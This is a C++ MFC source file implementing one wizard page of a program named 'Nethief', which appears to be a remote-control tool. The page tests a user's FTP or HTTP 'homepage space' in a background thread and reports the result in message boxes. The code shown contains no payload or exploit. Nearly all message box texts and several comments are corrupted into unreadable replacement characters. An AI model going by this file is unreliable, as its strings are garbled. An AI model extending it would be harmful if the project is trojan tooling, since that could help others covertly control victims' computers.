//Download by http://www.NewXing.com
// WizardPage5.cpp : implementation file
//

#include "stdafx.h"
#include "Nethief.h"
#include "WizardPage5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizardPage5 property page

IMPLEMENT_DYNCREATE(CWizardPage5, CPropertyPage)

CWizardPage5::CWizardPage5() : CPropertyPage(CWizardPage5::IDD)
{
	//{{AFX_DATA_INIT(CWizardPage5)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_pHomepageTestThread=NULL;
	m_bTestSucceed=FALSE;
}

CWizardPage5::~CWizardPage5()
{
}

void CWizardPage5::DoDataExchange(CDataExchange* pDX)
{
	CPropertyPage::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizardPage5)
	DDX_Control(pDX, IDC_EDIT_TEST, m_Edit_Test);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizardPage5, CPropertyPage)
	//{{AFX_MSG_MAP(CWizardPage5)
	ON_BN_CLICKED(IDC_BUTTON_TEST, OnButtonTest)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizardPage5 message handlers

BOOL CWizardPage5::OnQueryCancel() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
			return FALSE;
	}
	////////////////////////////////////////////////
	if(MessageBox("������͵������δ������ù��̡�\r\n\r\n�Ƿ����˳����򵼣�",
		"������͵ ������",MB_ICONQUESTION|MB_YESNO)==IDNO)
		return FALSE;
	
	return CPropertyPage::OnQueryCancel();
}

LRESULT CWizardPage5::OnWizardNext() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
			return TRUE;
	}
	////////////////////////////////////////////////
	if(!m_bTestSucceed)//�������δ�ɹ�,Ҫ��ʾ
	{
		if(MessageBox("���������ҳ�ռ���в��ԣ��ͻ��޷�ȷ�����������Ƿ���ȷ����ҳ�ռ��Ƿ����������ⶼ���ܵ��±�������ܹ�����������\r\n\r\n��ȷ��Ҫ����������",
			"������͵ ������",MB_ICONQUESTION|MB_YESNO)==IDNO)
		return TRUE;
	}

	CCommunity* pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	pCommunity->SetFtpServerInfo(4,
		"","","","",
		"","","","",
		"",
		"");
	
	return CPropertyPage::OnWizardNext();
}

LRESULT CWizardPage5::OnWizardBack() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
			return TRUE;
	}
	
	return CPropertyPage::OnWizardBack();
}

void CWizardPage5::OnButtonTest()
{
	// TODO: Add your control notification handler code here
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
			return;
	}
	////////////////////////////////////////////////
	m_Edit_Test.SetWindowText("");

	pHOMEPAGE_TEST_THREAD_PARAM pstHomepageTest=new HOMEPAGE_TEST_THREAD_PARAM;
	pstHomepageTest->pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	pstHomepageTest->pEdit_Test=&m_Edit_Test;
	pstHomepageTest->pbTestSucceed=&m_bTestSucceed;

	m_pHomepageTestThread=AfxBeginThread(HomepageTestProc,(LPVOID)pstHomepageTest);
	m_pHomepageTestThread->m_bAutoDelete=FALSE;
	return;
}

UINT HomepageTestProc(LPVOID pParam)
{
	pHOMEPAGE_TEST_THREAD_PARAM pstHomepageTest=(pHOMEPAGE_TEST_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstHomepageTest->pCommunity;
	CEdit*			pEdit_Test=pstHomepageTest->pEdit_Test;
	BOOL*			pbTestSucceed=pstHomepageTest->pbTestSucceed;
	delete pParam;
	//////////////////////////////////////////////
	int nRet=pCommunity->HomepageTest(pEdit_Test);
	switch(nRet)
	{
		case 1:
		{
			AfxGetMainWnd()->MessageBox("��ҳ�ռ乤��������",
				"������͵ ������",MB_ICONINFORMATION|MB_OK);
			*pbTestSucceed=TRUE;
			break;
		}
		case -1:
		{
			AfxGetMainWnd()->MessageBox("�������״̬ʧ�ܣ�\r\n\r\n��ǰδ���ӵ�Internet�������������ٽ��в��ԡ�",
				"������͵ ������",MB_ICONSTOP|MB_OK);
			break;
		}
		case -2:
		{
			AfxGetMainWnd()->MessageBox("��FTP��ʽ��¼��ҳ�ռ�ʧ�ܣ�\r\n\r\n���顰FTP��������������IP��ַ��������ҳ�ռ���û�����������ҳ�ռ�����롱�����Ƿ���ȷ��\r\n\r\n�����ȷ���������þ���ȷ������ô�п�������ҳ�ռ�����⣬������ҳ�ռ��ṩ����ϵ��",
				"������͵ ������",MB_ICONSTOP|MB_OK);
			break;
		}
		case -3:
		{
			AfxGetMainWnd()->MessageBox("��HTTP��ʽ������ҳʧ�ܣ�\r\n\r\n���顰�����ҳ�ռ����ַ�������Ƿ���ȷ��\r\n\r\n�����ȷ���������þ���ȷ������ô�п�������ҳ�ռ�����⣬������ҳ�ռ��ṩ����ϵ��",
				"������͵ ������",MB_ICONSTOP|MB_OK);
			break;
		}
	}
	
	return 0;
}
